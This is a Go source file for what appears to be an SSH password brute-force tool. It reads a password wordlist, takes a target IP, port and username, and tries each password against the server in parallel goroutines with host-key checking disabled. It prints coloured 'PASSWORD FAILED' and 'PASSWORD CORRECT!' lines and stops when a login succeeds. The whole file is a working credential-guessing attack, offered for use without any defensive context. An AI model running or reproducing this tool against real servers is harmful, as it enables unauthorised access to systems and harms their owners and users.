// mind map2 =>  https://pkg.go.dev/golang.org/x/crypto/ssh
// mind map3 => https://skarlso.github.io/2019/02/17/go-ssh-with-host-key-verification/

package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	inittime     = time.Now()
	passwordfile = flag.String("file", "defa.txt", "")
	ip           = flag.String("ip", "", "")
	port         = flag.Int("port", 22, "")
	user         = flag.String("user", "", "")
	timer        = flag.Duration("timer", 300*time.Millisecond, "")
	BLK          = "\033[0;30m"
	RED          = "\033[0;31m"
	GRN          = "\033[0;32m"
	YEL          = "\033[0;33m"
	BLU          = "\033[0;34m"
	MAG          = "\033[0;35m"
	CYN          = "\033[0;36m"
	WHT          = "\033[0;37m"
	BBLK         = "\033[1;30m"
	BRED         = "\033[1;31m"
	BGRN         = "\033[1;32m"
	BYEL         = "\033[1;33m"
	BBLU         = "\033[1;34m"
	BMAG         = "\033[1;35m"
	BCYN         = "\033[1;36m"
	BWHT         = "\033[1;37m"
	UBLK         = "\033[4;30m"
	URED         = "\033[4;31m"
	UGRN         = "\033[4;32m"
	UYEL         = "\033[4;33m"
	UBLU         = "\033[4;34m"
	UMAG         = "\033[4;35m"
	UCYN         = "\033[4;36m"
	UWHT         = "\033[4;37m"
	BLKB         = "\033[40m"
	REDB         = "\033[41m"
	GRNB         = "\033[42m"
	YELB         = "\033[43m"
	BLUB         = "\033[44m"
	MAGB         = "\033[45m"
	CYNB         = "\033[46m"
	WHTB         = "\033[47m"
	BLKHB        = "\033[0;100m"
	REDHB        = "\033[0;101m"
	GRNHB        = "\033[0;102m"
	YELHB        = "\033[0;103m"
	BLUHB        = "\033[0;104m"
	MAGHB        = "\033[0;105m"
	CYNHB        = "\033[0;106m"
	WHTHB        = "\033[0;107m"
	HBLK         = "\033[0;90m"
	HRED         = "\033[0;91m"
	HGRN         = "\033[0;92m"
	HYEL         = "\033[0;93m"
	HBLU         = "\033[0;94m"
	HMAG         = "\033[0;95m"
	HCYN         = "\033[0;96m"
	HWHT         = "\033[0;97m"
	BHBLK        = "\033[1;90m"
	BHRED        = "\033[1;91m"
	BHGRN        = "\033[1;92m"
	BHYEL        = "\033[1;93m"
	BHBLU        = "\033[1;94m"
	BHMAG        = "\033[1;95m"
	BHCYN        = "\033[1;96m"
	BHWHT        = "\033[1;97m"
)

type response struct {
	Error error
	mu    sync.Mutex
}

type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func newFileScanner() *fileScanner {
	return &fileScanner{}
}

func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}

func (f *fileScanner) Close() error {
	return f.File.Close()
}

func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}
	return f.Scanner
}

func cerr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func get_file_inf(file string) {
	finf, err := os.Stat(file)
	cerr(err)
	size := finf.Size()
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: File Byte Size   |=> ", size)
}

func is_on(url string) bool {
	res, err := http.Get(url)
	cerr(err)
	if res.StatusCode != 200 {
		fmt.Println("[ - ] USER OFFLINE")
		return true
	} else {
		fmt.Println("[ + ] USER ONLINE")
		return false
	}
}

// signal handeling for case interuption
func sighandel(c chan os.Signal) {
	signal.Notify(c, os.Interrupt)
	for s := <-c; ; s = <-c {
		switch s {
		case os.Interrupt:
			fmt.Println("\nDetected Interupt.....")
			t := time.Now()
			fmt.Println("\n\n\t\033[31m[>] Script Ended At -> ", t)
			os.Exit(0)
		case os.Kill:
			fmt.Println("\n\n\tKILL received")
			os.Exit(1)
		}
	}
}

func sshdialer(password string) *response {
	salida := &response{}
	sshinf := &ssh.ClientConfig{

		User:            *user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timer,
	}
	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), sshinf)
	if err != nil {
		fmt.Println(WHT, "[", RED, "TRY", WHT, " ]", RED, " PASSWORD FAILED -> ", password)
	} else {
		fmt.Println(WHT, "[", BLU, "TRY", WHT, " ] PASSWORD CORRECT! -> ", password)
		os.Exit(1)
	}
	salida.Error = err
	return salida
}

func printUsedValues() {
	flag.Parse()
	get_file_inf(*passwordfile)
	is_on("https://www.google.com") // network checking
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: File loaded      |=> ", *passwordfile)
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: IP address       |=> ", *ip)
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: Port of server   |=> ", *port)
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: User being used  |=> ", *user)
	fmt.Println(WHT, "[", BLU, "INFO", WHT, "] DATA: Timeout for AUTH |=> ", timer)
}

func main() {
	flag.Parse()
	fscanner := newFileScanner()
	err := fscanner.Open(*passwordfile)
	if err != nil {
		fmt.Println(RED, "[ INFO ] ERR: FATAL: When opening file [", *passwordfile, "]  the following error occured", err.Error())
	} else {
		printUsedValues()
	}
	scanner := fscanner.GetScan()
	for scanner.Scan() {
		password := scanner.Text()
		go func() {
			go sighandel(make(chan os.Signal, 1)) // signal handeler
			resp := sshdialer(password)
			resp.mu.Lock()
			if resp.Error == nil {
				fscanner.Close()
				resp.mu.Unlock()
				os.Exit(0)
			}
		}()
		time.Sleep(*timer)
	}
}
